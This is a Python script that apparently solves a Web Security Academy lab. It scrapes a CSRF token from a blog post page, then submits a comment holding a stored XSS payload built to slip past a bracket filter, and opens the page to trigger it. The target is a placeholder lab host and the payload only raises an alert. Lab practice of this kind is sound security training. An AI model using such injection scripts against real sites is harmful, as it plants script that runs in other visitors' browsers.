import requests
import webbrowser
from bs4 import BeautifulSoup


base_url = 'https://LAB-ID.web-security-academy.net/' # Replace with your actual lab ID
get_url = f"{base_url}post?postId=2"
post_url = f"{base_url}post/comment"
payload = "<><img src=1 onerror=alert('SemZ')>"

session = requests.Session()
response = session.get(get_url)

if response.status_code != 200:
    print(f"Failed to fetch page, Status Code: {response.status_code}")
    exit()

soup = BeautifulSoup(response.text, "html.parser")

csrf_input = soup.find("input", {"name" : "csrf"})
csrf_token = csrf_input["value"] if csrf_input else None

if csrf_token:
    print("Extracted CSRF Token:", csrf_token)
else:
    print("Failed to extract CSRF Token.")
    exit()

data = {
    "csrf": csrf_token,
    "postId": "2",
    "comment": payload,
    "name": "SemZ",
    "email": "semz@semz.com",
    "website": "https://semz.com"
}

response = session.post(url=post_url, data=data)

print("Response Status:", response.status_code)
if response.status_code == 200:
    print("Payload successfully submitted!")
    print(get_url)
    webbrowser.open(get_url)
else:
    print("Something went wrong.")
